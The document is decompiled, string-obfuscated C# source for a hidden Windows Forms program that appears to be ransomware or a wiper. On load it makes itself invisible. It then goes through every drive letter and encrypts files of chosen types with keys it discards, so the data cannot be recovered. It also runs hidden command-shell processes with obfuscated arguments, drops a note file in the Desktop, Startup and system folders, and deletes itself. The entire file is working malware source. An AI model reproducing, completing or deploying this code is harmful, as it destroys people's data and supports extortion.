using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

public class GForm0 : Form
{
	public enum KeySizes
	{
		SIZE_512 = 512,
		SIZE_1024 = 1024,
		SIZE_2048 = 2048,
		SIZE_952 = 952,
		SIZE_1369 = 1369
	}

	private static string string_0;

	private static string string_1;

	private IContainer icontainer_0 = null;

	public GForm0()
	{
		method_11();
	}

	public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[byte_0.Length];
		byte[] array2 = new byte[2048];
		byte[] array3 = new byte[2048];
		int i;
		for (i = 0; i < 2048; i++)
		{
			array2[i] = (byte)i;
			array3[i] = byte_1[i % byte_1.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 2048; i++)
		{
			num = (num + array2[i] + array3[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < array.GetLength(0); j++)
		{
			i = (i + 1) % 2048;
			num = (num + array2[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 2048;
			array[j] = (byte)(byte_0[j] ^ array2[num2]);
		}
		return array;
	}

	public string method_0(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append(smethod_5("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮")[random.Next(smethod_5("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮").Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void smethod_1(string string_2, string string_3)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		if (File.Exists(string_3))
		{
			File.Delete(string_3);
		}
		if (File.Exists(string_2))
		{
			File.Delete(string_2);
		}
		string text = (string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false));
		string text2 = (string_1 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private static byte[] smethod_2(string string_2, byte[] byte_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		string xmlString = string_0;
		rSACryptoServiceProvider.FromXmlString(xmlString);
		return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
	}

	public void method_1(string string_2, string string_3)
	{
		try
		{
			string[] source = new string[43]
			{
				smethod_5("*ŷɺ\u0375"),
				smethod_5("*ŧɭ\u0362"),
				smethod_5("+Šɬ\u0361ѹ"),
				smethod_5("*ŻɮͲ"),
				smethod_5("(Ŭɪ\u0367ѧչ"),
				smethod_5("*ųɦ\u0367"),
				smethod_5("*Źɫͱ"),
				smethod_5("*űɣͳ"),
				smethod_5("*ŠɱͲ"),
				smethod_5("*ůɬ\u036a"),
				smethod_5("+żɯͱѹ"),
				smethod_5("*ųɲ\u0375"),
				smethod_5("+ŴɳͶѹ"),
				smethod_5("*Ŭɦ\u0375"),
				smethod_5("*ũɲ\u0366"),
				smethod_5("*šɯͱ"),
				smethod_5("*ųɬ\u0366"),
				smethod_5("*Šɱͷ"),
				smethod_5("*Űɳ\u036d"),
				smethod_5("*Ůɦ\u0363"),
				smethod_5("*Űɮ\u036f"),
				smethod_5("*ųɪͱ"),
				smethod_5("*Ţɱͱ"),
				smethod_5("+ťɰͲѹ"),
				smethod_5("+Ŭɷ\u036fѭ"),
				smethod_5("*ūɶ\u036c"),
				smethod_5("-ůɭ"),
				smethod_5("*Żɯ\u036d"),
				smethod_5("*ųɱ\u0365"),
				smethod_5("-Šɪ"),
				smethod_5("*šɣ\u0375"),
				smethod_5("*Ůɲ\u0332"),
				smethod_5("*Ůɲ\u0335"),
				smethod_5("*Ŵɣͷ"),
				smethod_5("*Ŵɯ\u0360"),
				smethod_5("*Ţɴ\u0368"),
				smethod_5("+Šɪʹѹ"),
				smethod_5("*Ůɩͷ"),
				smethod_5("+ũɳ\u0367Ѧ"),
				smethod_5("*Ŵɯͷ"),
				smethod_5("*Ůɭͷ"),
				smethod_5("*Ŭɥ\u0366"),
				smethod_5("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_2);
			string[] directories = Directory.GetDirectories(string_2);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_2(files[i], string_3);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_1(directories[j], string_3);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_2(string string_2, string string_3)
	{
		byte[] byte_ = File.ReadAllBytes(string_2);
		byte[] bytes = Encoding.UTF8.GetBytes(string_3);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_0(byte_, bytes);
		File.WriteAllBytes(string_2, bytes2);
		File.Move(string_2, string_2);
	}

	public void method_3(string string_2)
	{
		byte[] array = File.ReadAllBytes(string_2);
		byte[] bytes = smethod_2(string_0, Encoding.UTF8.GetBytes(array.ToString()));
		File.WriteAllBytes(string_2, bytes);
		File.Move(string_2, string_2 + smethod_5("'ŸɦʹѤշ٪ݶࡤ"));
	}

	public void method_4(string string_2)
	{
		try
		{
			string[] source = new string[41]
			{
				smethod_5("*ŷɺ\u0375"),
				smethod_5("*ŧɭ\u0362"),
				smethod_5("+Šɬ\u0361ѹ"),
				smethod_5("*ŻɮͲ"),
				smethod_5("(Ŭɪ\u0367ѧչ"),
				smethod_5("*ųɦ\u0367"),
				smethod_5("*Źɫͱ"),
				smethod_5("*űɣͳ"),
				smethod_5("*ŠɱͲ"),
				smethod_5("*ůɬ\u036a"),
				smethod_5("+żɯͱѹ"),
				smethod_5("*ųɲ\u0375"),
				smethod_5("+ŴɳͶѹ"),
				smethod_5("*Ŭɦ\u0375"),
				smethod_5("*ũɲ\u0366"),
				smethod_5("*šɯͱ"),
				smethod_5("*ųɬ\u0366"),
				smethod_5("*Šɱͷ"),
				smethod_5("*Űɳ\u036d"),
				smethod_5("*Ůɦ\u0363"),
				smethod_5("*Űɮ\u036f"),
				smethod_5("*ųɪͱ"),
				smethod_5("*Ţɱͱ"),
				smethod_5("+ťɰͲѹ"),
				smethod_5("+Ŭɷ\u036fѭ"),
				smethod_5("*Żɯ\u036d"),
				smethod_5("*ųɱ\u0365"),
				smethod_5("-Šɪ"),
				smethod_5("*šɣ\u0375"),
				smethod_5("*Ůɲ\u0332"),
				smethod_5("*Ůɲ\u0335"),
				smethod_5("*Ŵɣͷ"),
				smethod_5("*Ŵɯ\u0360"),
				smethod_5("*Ţɴ\u0368"),
				smethod_5("+Šɪʹѹ"),
				smethod_5("*Ůɩͷ"),
				smethod_5("+ũɳ\u0367Ѧ"),
				smethod_5("*Ŵɯͷ"),
				smethod_5("*Ůɭͷ"),
				smethod_5("*Ŭɥ\u0366"),
				smethod_5("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_2);
			string[] directories = Directory.GetDirectories(string_2);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_3(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_4(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private void method_5()
	{
		smethod_1(string_0, string_1);
		method_4(smethod_5("@ĸɝ"));
		method_4(smethod_5("Bĸɝ"));
		method_4(smethod_5("Aĸɝ"));
		method_4(smethod_5("@ĸɝ"));
		method_4(smethod_5("Gĸɝ"));
		method_4(smethod_5("Fĸɝ"));
		method_4(smethod_5("Eĸɝ"));
		method_4(smethod_5("Dĸɝ"));
		method_4(smethod_5("Kĸɝ"));
		method_4(smethod_5("Jĸɝ"));
		method_4(smethod_5("Iĸɝ"));
		method_4(smethod_5("Hĸɝ"));
		method_4(smethod_5("Oĸɝ"));
		method_4(smethod_5("Nĸɝ"));
		method_4(smethod_5("Mĸɝ"));
		method_4(smethod_5("Lĸɝ"));
		method_4(smethod_5("Sĸɝ"));
		method_4(smethod_5("Rĸɝ"));
		method_4(smethod_5("Qĸɝ"));
		method_4(smethod_5("Pĸɝ"));
		method_4(smethod_5("Wĸɝ"));
		method_4(smethod_5("Vĸɝ"));
		method_4(smethod_5("Uĸɝ"));
		method_4(smethod_5("Tĸɝ"));
		method_4(smethod_5("[ĸɝ"));
		method_4(smethod_5("Zĸɝ"));
		method_4(smethod_5("Yĸɝ"));
		string_0 = null;
		string_1 = null;
		string string_ = method_0(256);
		method_1(smethod_5("@ĸɝ"), string_);
		method_1(smethod_5("Bĸɝ"), string_);
		method_1(smethod_5("Aĸɝ"), string_);
		method_1(smethod_5("@ĸɝ"), string_);
		method_1(smethod_5("Gĸɝ"), string_);
		method_1(smethod_5("Fĸɝ"), string_);
		method_1(smethod_5("Eĸɝ"), string_);
		method_1(smethod_5("Dĸɝ"), string_);
		method_1(smethod_5("Kĸɝ"), string_);
		method_1(smethod_5("Jĸɝ"), string_);
		method_1(smethod_5("Iĸɝ"), string_);
		method_1(smethod_5("Hĸɝ"), string_);
		method_1(smethod_5("Oĸɝ"), string_);
		method_1(smethod_5("Nĸɝ"), string_);
		method_1(smethod_5("Mĸɝ"), string_);
		method_1(smethod_5("Lĸɝ"), string_);
		method_1(smethod_5("Sĸɝ"), string_);
		method_1(smethod_5("Rĸɝ"), string_);
		method_1(smethod_5("Qĸɝ"), string_);
		method_1(smethod_5("Pĸɝ"), string_);
		method_1(smethod_5("Wĸɝ"), string_);
		method_1(smethod_5("Vĸɝ"), string_);
		method_1(smethod_5("Uĸɝ"), string_);
		method_1(smethod_5("Tĸɝ"), string_);
		method_1(smethod_5("[ĸɝ"), string_);
		method_1(smethod_5("Zĸɝ"), string_);
		method_1(smethod_5("Yĸɝ"), string_);
		string_ = null;
	}

	public static void smethod_3()
	{
		Process currentProcess = Process.GetCurrentProcess();
		try
		{
			currentProcess.MinWorkingSet = (IntPtr)300000;
		}
		catch (Exception)
		{
			throw new Exception();
		}
	}

	public void method_6()
	{
		method_7();
		Thread.Sleep(1200);
		method_7();
		Thread.Sleep(1200);
		method_7();
	}

	public void method_7()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = smethod_5("dūɡ\u032aѦպ٤");
			processStartInfo.Arguments = smethod_5("\u0005ŪȈ\u0351ѕՖم\u0747ࡏ\u0948\u0a4e\u0b31౻\u0d65\u0e79༻ၾᅼቴ፲ᑢᕰᘴᝠ\u187aᥰ\u1a74᭠ᱹᵾḬἤ\u206bⅥ≤⌧\u2429╴♱❪⡧⥵");
			process.StartInfo = processStartInfo;
			process.Start();
			Process process2 = new Process();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = smethod_5("dūɡ\u032aѦպ٤");
			processStartInfo2.Arguments = smethod_5("6śȷ\u0361Ѹս\u0670\u0732ࡢॸ੮୪\u0c62ൻ\u0e68ཥၹᅱሧ።ᑠᕨᙦ\u1776ᡤ");
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Process process3 = new Process();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = smethod_5("dūɡ\u032aѦպ٤");
			processStartInfo3.Arguments = smethod_5("\u000fŜȾ\u036aѾպپݴ\u0871ॹਸ਼ୱ\u0c71ൿ\u0e77ཥၵᄯቭ፬ᑸᕪᙦᝦᡯ\u1927ᨫ᭴ᱱᵪṧή");
			process3.StartInfo = processStartInfo3;
			process3.Start();
		}
		catch (Exception)
		{
		}
	}

	public void method_8()
	{
		string text = method_0(25);
		string[] contents = new string[68]
		{
			smethod_5("fŸȜ\u0318Еԁ؍܃\u0817ॱਘଛ\u0c03\u0d01\u0e6c༛ဟᄋሄጎᐅᕥᙣᝮᡭ\u196e\u1a17ᬌᱽᴒḓ\u1f7f\u206eⅽ∘⍿③╸♸✓⠆⤟⨀⬞Ⰱⴂ\u2e69⽥」ㄉ㈏㍏㑒㕑㙔㜙㠍㤎㩗㭨㱩㴳㹫㼨䀴䅶䉪䍰䐹䕁䙆䜼䡺䥥䩽䭣䰺䴢乿使偸兠剫即吨啡噰坧堥夿"),
			smethod_5(":ŭɰ\u036eѮԿ"),
			smethod_5(":ŭɡ\u0362ѦԿ"),
			smethod_5("'Ůɰ\u036cѻճثݝ\u087dॡ\u0a65\u0b62౺൭\u0e79ཥ\u1064ᅤቺጴᐨᕲᙬᝰᡯᥧᨿ"),
			smethod_5("+ťɡ\u036dѿշرݤ\u0876ॾ੨\u0b31బൾ\u0e6c\u0f70\u1073ᄩቦ፷ᑰᔥᘿ"),
			smethod_5("dŪɠͺТպ"),
			smethod_5("yŠɲ\u0362мԥر\u0733\u0827\u093a"),
			smethod_5("|"),
			smethod_5("+Ŧɪ\u0365Ѻ"),
			smethod_5("tžɾͻУպ٩ݢ\u086dॡ\u0a7cଽద൧\u0e6b\u0f6fၦᄺ"),
			smethod_5("mťɧͼнԦذ\u0734\u0873ॺ\u0a3a"),
			smethod_5("vŠɠ\u0379Сո٣ݳ\u086dऽਦଶఱ൳\u0e7a༺"),
			smethod_5("|"),
			smethod_5("*Ūɫͺ"),
			smethod_5("tžɾͻУպ٩ݢ\u086dॡ\u0a7cଽద൧\u0e6b\u0f6fၦᄺ"),
			smethod_5("mťɧͼнԦذ\u0734\u0873ॺ\u0a3a"),
			smethod_5("vŠɠ\u0379Сո٣ݳ\u086dऽਦଷఱ൳\u0e7a༺"),
			smethod_5("|"),
			smethod_5("*ńɅͺ"),
			smethod_5("vŠɠ\u0379Сո٣ݳ\u086dऽਦ\u0b34ఱ൳\u0e7a༺"),
			smethod_5("|"),
			smethod_5("*ŗɖͺ"),
			smethod_5("vŠɠ\u0379Сո٣ݳ\u086dऽਦ\u0b34\u0c3c൳\u0e7a༺"),
			smethod_5("|"),
			smethod_5("*Ōɍͺ"),
			smethod_5("vŠɠ\u0379Сո٣ݳ\u086dऽਦଷఱ൳\u0e7a༺"),
			smethod_5("|"),
			smethod_5("4Ĩɵͱѽկ٧\u073f"),
			smethod_5(";)\0\0\0\0\0"),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5("") + text + smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5(""),
			smethod_5("IĖȁ\u034cэԃ؟\u070fࠃ\u094cਈଆఈഛดཛ၇ᄰሷፀᑟᕜᘾᝠ\u180f\u1939ᨶ\u1b3f\u1c34ᴺḲἤ⁵℠∻⌳␥╰☦✨⡭⤵⨤⬿Ⱪ\u2d2c⸨⼨ぢ\u3130㉣㌵㐠㔮㙋㜞㡉㥓㨛㭊㱘㵁㸗㽏䁚䅁䈓䍅䑘䕜䙃䜎䡃䥃䩟䬊䱋䵍万佇假先剆匂呕問嘿坹塸奨娻季屶嵭帷彰恼慸扶捡搱敲普杭桦椢樷欥汨洶渻漩灶煴牢獬琿"),
			smethod_5("\u000fŐɃ\u030eГՌ\u065fܒ\u0817ख़ਖ਼\u0b49\u0c49ആๆ\u0f48၂ᅑቒጝᐽᕼᙴ\u177bᠹ\u1924ᨥ᭹\u1c29ᵗṡὠ⁶ⅼ≥⍹①╠☭✭⠷⤥⩨⬶ⰻ\u2d29\u2e76⽴ぢㅬ㈿"),
			smethod_5("ãƼʯϢӧ\u05b8ګߦ\u08ebথથவಽ\u0df2າ\u0fbcႮᆽኾᏱᓩᖞ\u169d\u17ea\u18f9᧺᪩\u1bad\u1cfdᶍắᾬ\u20c6↞⋞⏓ⓖ◗⛌⟖⣞⧕⫔⯀Ⳛⷝ⻟⾐ホ㇆㋟㏃㓞㗍㛁㞈㣈㧓㫗㮄㳆㷏㻀㿉䃳䆾䋾䏽䓵䖺䛾䟭䣶䧤䫴䯺䳧䷷仴侰僩凧勡叩咫嗸囬埫壨姰嫠寶岣巤廮忲恟愇戒按摕敚昮朝桗椗樇欑汓洜渞漄灏焜爈猟琛甅瘇眛砎礄稉笁籃約縎缒聿脪舵茹葻蔻蘺蜬蠾褹註謧豳贽踷轰逻鄦鈤錾鐯镪阹霩頵餲騬鬡鰰鵢鸶鼨ꁐꄞꉍꍎꑔꕗꙐꝋꡒꤖꩁ\uab5b갓굚깔꽜끟넎뉔덃둞딊뙄띇롔륒먅뭋뱅뵖비뽎쀿셪쉵썹쑢씺외읪졲줶쩦쭷챲쵿칼콵큽텽툣팰퐤핦홠휶\ud83b\ud929\uda76\udb74\udc62\udd6c\ude3f"),
			smethod_5("nĳȢͱѲԾؼܪࠤ३ਫଫధശ\u0e37\u0f7e\u1060ᄕሔጝ᐀ᔁᙐ\u1752᠄ᥩᩔ᭒᱗ᵆṑ\u1f1f‒⅕≟⌏⑀╂♘✋⡞⥛⩑⬇ⱒⵊ⸄⽑ぇㅏ㉁㍲㑻㔽㙹㝵㡹㥫㩡㭧㱢㵰㹰㼳䁴䅸䉼䍪䑽䔣䘰䜤䡦䥠䨶䬻䰩䵶乴佢偬儿"),
			smethod_5("\u0087ǘˋΆҋ\u05c5ۅߕ\u08dd\u0992\u0ad2\u0bdc\u0cce\u0dddໞ\u0f91\u1089ᇾዽᎊᒙᖚᛉ\u17cdᢝ᧫\u1ac7\u1b80\u1ce6\u1df1Ứᾼ\u20ec⇻⋷⏬Ⓑ◢⛺➴⣾⧳⫺⯵ⲯ\u2dfd\u2ef8\u2ffeヮㆪ㋽㏠㓦㗲㚥㟭㣷㦢㫨㯳㱟㴗㸐㼌䀔䄉䈊䌑䐕䔚䘐䝔䠇䤝䩑䬂䰊䴍丂会倎儘剉匎后唊嘀圗塃夗娒嬉就崹幽弨怳愳戫挼摺攦昴朦栧椫橱欣氠洨渹漻瀪焸爬獤瑧產瘪睤砷礪稨笳簟結繒罈耛腕艗茘葖蕚虙蜔衕襛詝譕豜贂踍轃遟酂鉌鍚鑐镏陖靁頃饛驎魕鰿鵳鹼齥ꀻꅶꉶꍫꑲꔶ\ua674ꝸ\ua87fꤲꩵꭱ걻굯긣꼰뀤녦뉠댶됻딩뙶띴롢륬먿"),
			smethod_5("KĔȇ\u034aяԁ\u0601\u0711ࠁ\u094e\u0a0e\u0b00ఊങบཕ၅ᄲሱፆᑝᕞᘍᜉᡡᤑᨨᬮᱻᴽḶἹ※ⅶ∼⌧⑳┦☾❰⠽⤫⨹⬹ⰹⴤ\u2e69⼱〨ㄳ㈷㍤㐧㔣㘵㜡㠓㤞㩟㭉㱏㴚㹐㽞䀗䅏䉚䍁䐓䕖䙞䝞䠈䥚䨍䭏䱄䵄九佉偄兒刅卑呐唎嘁块塺夾婪孵屷嵶帹彶恸慢戵捧摦敱晲杵桪楪樣欰氤浦湠漶瀻焩牶獴瑢畬瘿"),
			smethod_5(":Īɠ\u036aѴԿ"),
			smethod_5(";ĩɧ\u036bѧջؿ"),
			smethod_5(";ĩɭͰѮծؿ")
		};
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path3 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path4 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path6 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		string path7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + smethod_5("BŝɎ\u035eћ՝هݚࡓ\u094a\u0a52\u0b5a\u0c5eൔ๏ཊ၀ᅎ\u125eፒᑚᕝᙍᝃᡆ\u192b\u1a6c᭷ᱯᵭ");
		File.WriteAllLines(path, contents);
		File.WriteAllLines(text2, contents);
		File.WriteAllLines(path2, contents);
		File.WriteAllLines(path3, contents);
		File.WriteAllLines(path4, contents);
		File.WriteAllLines(path5, contents);
		File.WriteAllLines(path6, contents);
		File.WriteAllLines(path7, contents);
		Process.Start(text2);
		contents = null;
	}

	private static void smethod_4()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = smethod_5("\fšȁ\u0343ѷձٴݿ\u087e\u093aਸ਼\u0b5bష൏\u0e35༻ၝᄲሾፔᐯᕗᘭᜣᡟ\u192aᨸᬨᰡᴦṁὡ\u206f™∣") + Process.GetCurrentProcess().MainModule!.FileName + smethod_5("#"),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = smethod_5("dūɡ\u032aѦպ٤")
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}

	private void method_9()
	{
		method_5();
		smethod_3();
		method_6();
		method_8();
		smethod_3();
		smethod_4();
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		method_9();
	}

	private void method_10(object sender, EventArgs e)
	{
		string_0 = null;
		string_1 = null;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_11()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(123, 59));
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(smethod_5("Cūɱ\u036fа"));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(smethod_5("iųɺ\u0365ѧյ٣ݷ\u082a०\u0a7a\u0b64"));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)this).ResumeLayout(false);
	}

	private static string smethod_5(string string_2)
	{
		int length = string_2.Length;
		char[] array = new char[length];
		for (int i = 0; i < array.Length; i++)
		{
			char c = string_2[i];
			byte b = (byte)(c ^ (length - i));
			byte b2 = (byte)(((int)c >> 8) ^ i);
			array[i] = (char)((b2 << 8) | b);
		}
		return string.Intern(new string(array));
	}
}
